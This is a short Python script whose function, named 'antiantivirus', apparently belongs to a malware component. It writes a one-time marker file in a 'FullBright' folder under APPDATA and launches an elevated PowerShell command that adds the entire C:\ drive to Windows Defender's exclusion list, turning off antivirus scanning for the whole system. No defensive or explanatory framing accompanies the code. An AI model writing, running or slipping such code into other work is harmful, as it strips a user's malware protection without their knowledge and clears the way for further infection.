import os, subprocess
def antiantivirus():
 path=os.path.join(os.getenv('APPDATA'),'Roaming','FullBright')
 finished_file=os.path.join(path,'finished.fullbright')
 if os.path.exists(finished_file): 
  print("Already executed, skipping.")
  return
 if not os.path.exists(path):os.makedirs(path)
 try:
  print("Running PowerShell as Admin to add exclusion...")
  subprocess.run(['powershell', '-Command', 'Start-Process powershell -ArgumentList "Add-MpPreference -ExclusionPath C:\\" -Verb RunAs'], shell=True, check=True)
  print("Exclusion added successfully.")
 except subprocess.CalledProcessError as e:
  print(f"Error: {e}")
 with open(finished_file, 'w'): pass